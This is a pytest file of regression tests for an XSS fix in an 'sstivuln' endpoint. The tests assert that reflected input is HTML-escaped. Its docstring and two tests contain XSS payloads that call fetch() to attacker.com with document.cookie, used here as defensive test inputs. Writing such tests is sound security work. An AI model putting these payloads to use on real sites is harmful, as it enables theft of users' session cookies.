"""
Proof tests for the XSS fix in ssti.py (sstivuln endpoint).

Attack vector:
  POST /api/sstivuln with {"mathexp": "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"}
  The vulnerable code reflected the rendered string verbatim into the JSON
  response without HTML-escaping. Any frontend rendering msg via innerHTML
  would execute the injected JavaScript.

The fix wraps the Jinja2 render call with html.escape(), consistent with
xss.py:12, rfi.py:65, and hhi.py:24.
"""

from ssti import sstivuln


def test_script_tag_xss_is_escaped():
    """<script> payload must be HTML-escaped in the response (would FAIL on vulnerable code)."""
    payload = "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
    result, status = sstivuln({"mathexp": payload})
    assert status == 200
    msg = result["msg"]
    assert "<script>" not in msg, f"Raw <script> tag reflected in response: {msg!r}"
    assert "&lt;script&gt;" in msg, f"Expected escaped &lt;script&gt; but got: {msg!r}"


def test_img_onerror_xss_is_escaped():
    """<img onerror=...> attack from the exploitation scenario must be escaped."""
    payload = "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"
    result, status = sstivuln({"mathexp": payload})
    assert status == 200
    msg = result["msg"]
    assert "<img" not in msg, f"Raw <img> tag in response: {msg!r}"
    assert "&lt;img" in msg, f"Expected escaped &lt;img but got: {msg!r}"


def test_angle_brackets_escaped():
    """Any angle-bracket content must not appear raw in the response."""
    result, status = sstivuln({"mathexp": "<b>bold</b>"})
    assert status == 200
    msg = result["msg"]
    assert "<b>" not in msg
    assert "&lt;b&gt;" in msg


def test_ampersand_escaped():
    """Ampersands in mathexp must be escaped to &amp;."""
    result, status = sstivuln({"mathexp": "a&b"})
    assert status == 200
    assert "&amp;" in result["msg"]


def test_safe_text_still_returned():
    """Plain alphanumeric input must pass through unchanged (regression guard)."""
    result, status = sstivuln({"mathexp": "hello world"})
    assert status == 200
    assert "hello world" in result["msg"]
